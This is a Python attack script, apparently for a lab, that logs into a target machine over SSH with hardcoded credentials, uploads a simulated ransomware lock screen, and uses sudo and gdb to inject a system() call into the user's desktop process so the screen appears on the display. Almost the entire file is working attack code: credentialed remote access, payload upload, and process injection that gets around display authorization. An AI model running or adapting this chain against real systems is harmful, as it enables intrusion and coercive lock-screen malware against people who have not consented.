#!/usr/bin/env python3
import sys
import paramiko

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.100" # The hardened Kali VM
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")

    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time

def pay_ransom():
    lbl.config(text="Decrypting...")
    root.update()
    for i in range(0, 101, 10):
        lbl.config(text=f"Decrypting your files... {i}%")
        root.update()
        time.sleep(0.2)
    root.destroy()

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True) 
root.configure(background='black')
root.overrideredirect(True) 

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True)

btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

root.protocol("WM_DELETE_WINDOW", lambda: None)
root.mainloop()
"""

    try:
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Bypassing X11/Wayland Authorization via GDB injection...")
        
        # We need to find the PID of a process running on the active display.
        # xfdesktop is common on Kali (XFCE), gnome-shell for GNOME, etc.
        # We grab the first process we can find that belongs to the user.
        find_pid_cmd = f"pgrep -u {USERNAME} -f 'xfdesktop|gnome-shell|plasmashell|xfce4-session' | head -n 1"
        stdin, stdout, stderr = ssh.exec_command(find_pid_cmd)
        pid = stdout.read().decode().strip()

        if not pid:
            # Fallback to the first GUI process we can find for the user
            stdin, stdout, stderr = ssh.exec_command(f"pgrep -u {USERNAME} | head -n 1")
            pid = stdout.read().decode().strip()

        if not pid:
            print("[-] Could not find an active GUI process for the user. Are they logged in?")
            ssh.close()
            sys.exit(1)
            
        print(f"[+] Found active GUI process PID: {pid}")

        # Now we use gdb to attach to that PID, call system() to run our script, and detach.
        # We use sudo to get the necessary permissions to attach to the process.
        # We use -p to attach, -batch to run non-interactively, and -ex to execute commands.
        gdb_cmd = (
            f"echo '{PASSWORD}' | sudo -S gdb -p {pid} -batch "
            f"-ex 'call (int)system(\"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &\")' "
            f"-ex 'detach' "
            f"-ex 'quit'"
        )
        
        print("[*] Injecting command into GUI process...")
        stdin, stdout, stderr = ssh.exec_command(gdb_cmd)
        
        # Wait for the command to finish
        stdout.channel.recv_exit_status()
        
        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
        ssh.close()

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
